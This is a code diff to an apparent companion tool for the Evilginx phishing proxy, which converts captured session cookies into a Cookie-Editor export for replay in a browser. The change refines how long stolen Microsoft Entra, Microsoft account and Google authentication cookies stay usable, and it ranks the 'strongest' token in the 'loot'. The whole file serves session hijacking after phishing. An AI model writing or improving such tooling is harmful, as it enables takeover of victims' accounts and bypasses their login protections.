@@ -25,7 +25,7 @@ import (
 //go:embed index.html
 var indexHTML []byte
 
-const version = "1.3.0"
+const version = "1.3.1"
 
 // ---- Evilginx data model (matches kgretzky/evilginx2 database.Session) ----
 
@@ -106,9 +106,11 @@ func (s Session) exportCookies() []ExpCookie {
 				}
 			}
 			exp, kind := cookieTTL(name, ct.Value, captured)
-			session := kind == "session"
+			session := kind == "session" || kind == "idle24h"
 			if exp == 0 && !session {
-				exp = captured + 365*24*3600
+				// Cookie-Editor needs an Expires to persist the cookie in the browser.
+				// Not a claim about IdP validity — see ttl_kind in the API.
+				exp = captured + 90*24*3600
 			}
 			out = append(out, ExpCookie{
 				Path:           path,
@@ -157,8 +159,8 @@ type lootInfo struct {
 	Token      string // strongest cookie name
 	Persistent bool
 	Tokens     []string
-	Expires    int64  // unix; 0 = browser session or unknown
-	TTLKind    string // parsed | typical | session | unknown
+	Expires    int64  // unix; only set for JWT exp
+	TTLKind    string // parsed | idle90d | idle24h | session | persistent | unknown
 }
 
 func jwtExp(val string) (int64, bool) {
@@ -182,26 +184,33 @@ func jwtExp(val string) (int64, bool) {
 	return claims.Exp, true
 }
 
-// cookieTTL is the replay window of a captured auth cookie. Evilginx does not
-// store Max-Age, so we parse JWT exp when present and otherwise use the
-// documented typical lifetime from the moment of capture.
+// cookieTTL classifies how long a captured auth cookie can be replayed.
+// Evilginx does not store Set-Cookie Max-Age/Expires. JWT exp is the only
+// hard timestamp. Everything else is Microsoft's published session model,
+// not a countdown from capture:
+//
+//   idle90d  — ESTSAUTHPERSISTENT: 90-day max inactivity, rolling, until-revoked
+//              (learn.microsoft.com identity-platform/configurable-token-lifetimes)
+//   idle24h  — ESTSAUTH: 24 hours or until the browser is closed
+//              (learn.microsoft.com entra KMSI: non-persistent cookie)
+//   session  — no Expires on the cookie (dies with the browser)
+//   persistent — survives browser close; Microsoft does not publish Max-Age
+//              for MSA __Host-MSAAUTHP. Do not invent 1 year.
 func cookieTTL(name, value string, captured int64) (expires int64, kind string) {
 	if exp, ok := jwtExp(value); ok {
 		return exp, "parsed"
 	}
-	if captured <= 0 {
-		captured = time.Now().Unix()
-	}
-	day := int64(24 * 3600)
 	switch strings.ToLower(name) {
 	case "estsauthpersistent":
-		return captured + 90*day, "typical" // Entra KMSI default
+		return 0, "idle90d"
+	case "estsauth":
+		return 0, "idle24h"
 	case "__host-msaauthp", "rpssecauth", "mspauth":
-		return captured + 365*day, "typical" // MSA persistent ~1y
-	case "estsauth", "__host-msaauth", "signinstatescookie":
+		return 0, "persistent"
+	case "__host-msaauth", "signinstatescookie":
 		return 0, "session"
 	case "sid", "hsid", "ssid", "apisid", "sapisid", "lsid", "__secure-1psid", "__secure-3psid":
-		return captured + 2*365*day, "typical"
+		return 0, "persistent"
 	default:
 		return 0, "unknown"
 	}
